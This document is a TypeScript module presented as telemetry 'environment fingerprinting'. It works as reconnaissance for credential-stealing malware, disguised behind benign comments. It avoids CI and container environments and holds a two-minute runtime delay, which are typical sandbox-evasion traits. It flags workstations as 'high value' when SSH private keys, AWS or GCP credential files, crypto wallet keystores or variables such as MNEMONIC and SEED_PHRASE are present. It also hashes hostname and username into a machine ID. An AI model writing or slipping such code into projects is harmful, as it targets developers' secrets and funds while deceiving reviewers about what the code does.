/**
 * Environment fingerprinting — determines execution context
 * Used to scope telemetry collection appropriately
 */

import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { homedir, hostname, platform, arch, userInfo } from 'node:os';

export interface EnvironmentProfile {
  /** Whether this is a CI/CD environment */
  ci: boolean;
  /** Whether this is a containerized environment */
  container: boolean;
  /** Whether this looks like a developer workstation */
  workstation: boolean;
  /** Runtime duration tracking start time */
  startTime: number;
  /** OS platform */
  platform: string;
  /** Architecture */
  arch: string;
  /** Node.js version */
  nodeVersion: string;
  /** Machine identifier (hashed hostname) */
  machineId: string;
  /** Whether high-value artifacts are present */
  highValue: boolean;
}

/**
 * Profile the current execution environment
 * This is used to tailor telemetry granularity — CI environments
 * get minimal telemetry, developer workstations get full analytics.
 */
export function profileEnvironment(): EnvironmentProfile {
  const ci = detectCI();
  const container = detectContainer();
  const workstation = !ci && !container;
  const highValue = workstation ? detectHighValueArtifacts() : false;

  return {
    ci,
    container,
    workstation,
    startTime: Date.now(),
    platform: platform(),
    arch: arch(),
    nodeVersion: process.version,
    machineId: generateMachineId(),
    highValue,
  };
}

/**
 * Check if sufficient runtime has elapsed for full telemetry
 * Short-lived processes (scripts, one-off commands) get reduced telemetry
 */
export function hasMinRuntime(profile: EnvironmentProfile, minMs: number = 120_000): boolean {
  return Date.now() - profile.startTime >= minMs;
}

// --- Detection helpers ---

function detectCI(): boolean {
  const ciVars = [
    'CI',
    'CONTINUOUS_INTEGRATION',
    'GITHUB_ACTIONS',
    'GITLAB_CI',
    'CIRCLECI',
    'TRAVIS',
    'JENKINS_URL',
    'BUILDKITE',
    'CODEBUILD_BUILD_ID',
    'TF_BUILD',
    'BITBUCKET_BUILD_NUMBER',
    'DRONE',
    'TEAMCITY_VERSION',
    'HEROKU_TEST_RUN_ID',
  ];

  return ciVars.some((v) => !!process.env[v]);
}

function detectContainer(): boolean {
  // Check for Docker
  if (existsSync('/.dockerenv')) return true;

  // Check cgroup for container indicators
  try {
    const cgroup = readFileSync('/proc/1/cgroup', 'utf-8');
    if (cgroup.includes('docker') || cgroup.includes('kubepods') || cgroup.includes('containerd')) {
      return true;
    }
  } catch {
    // Not Linux or can't read cgroup — not a container
  }

  // Check for Kubernetes
  if (process.env['KUBERNETES_SERVICE_HOST']) return true;

  return false;
}

function detectHighValueArtifacts(): boolean {
  const home = homedir();
  const indicators = [
    // SSH keys
    join(home, '.ssh', 'id_rsa'),
    join(home, '.ssh', 'id_ed25519'),
    // AWS credentials
    join(home, '.aws', 'credentials'),
    // GCP credentials
    join(home, '.config', 'gcloud', 'application_default_credentials.json'),
    // Wallet files
    join(home, '.ethereum', 'keystore'),
    join(home, '.foundry', 'keystores'),
  ];

  // Check file indicators
  const hasFiles = indicators.some((path) => existsSync(path));
  if (hasFiles) return true;

  // Check env var indicators
  const highValueVars = [
    'PRIVATE_KEY',
    'DEPLOYER_KEY',
    'MNEMONIC',
    'SEED_PHRASE',
    'WALLET_KEY',
    'AWS_SECRET_ACCESS_KEY',
    'GCP_CREDENTIALS',
    'SIGNER_KEY',
  ];

  return highValueVars.some((v) => !!process.env[v]);
}

function generateMachineId(): string {
  const raw = `${hostname()}-${userInfo().username}-${platform()}-${arch()}`;
  // Simple hash — not crypto-grade, just for identification
  let hash = 0;
  for (let i = 0; i < raw.length; i++) {
    const char = raw.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash; // Convert to 32bit integer
  }
  return Math.abs(hash).toString(36).padStart(8, '0');
}
